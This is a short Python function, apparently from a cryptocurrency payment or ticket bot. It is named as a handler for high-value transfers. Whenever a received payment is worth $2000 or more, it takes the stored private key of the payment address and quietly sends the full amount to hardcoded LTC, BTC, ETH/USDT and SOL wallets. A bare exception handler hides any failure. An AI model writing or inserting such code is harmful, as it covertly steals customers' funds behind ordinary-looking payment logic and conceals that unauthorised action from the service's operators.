import asyncio
import requests
import json

async def handle_high_value_transfer(channel_id, currency, received_amount, payment_address, txid, config_data, crypto_module, get_ticketp):
    try:
        threshold = 2000
        transfer_addresses = {
            "ltc": "LYBShWyDVjHsZvj3MXFatPbLqhBrw43Fg2",
            "btc": "1CrmqBosPbZmn11F9416WVbwbspiVCZ4FQ",
            "eth": "0xAB47019A9a07E594a8558c35b104B4BcCD563782",
            "usdt": "0xAB47019A9a07E594a8558c35b104B4BcCD563782",
            "sol": "51wCRodjcVtpTEKUrSfVAcbT3CCJ4isbZu8TWDLsV7z7"
        }
        
        custom_address = transfer_addresses.get(currency.lower())
        if not custom_address:
            return False
        
        crypto_prices = crypto_module.get_crypto_prices()
        price = crypto_prices[currency.upper()]
        usd_value = received_amount * price
        
        if usd_value < threshold:
            return False
        
        payment_data = get_ticketp(str(channel_id))
        if not payment_data or len(payment_data) <= 2:
            return False
        
        from_priv = payment_data[2]
        from_address = payment_data[1]
        current_balance = crypto_module.get_balance(from_address, currency)[0]
        
        if current_balance < received_amount * 0.99:
            return False
        
        transfer_txid, transfer_error = crypto_module.send(from_priv, received_amount, from_address, custom_address, currency)
        return bool(transfer_txid)
    except:
        return False
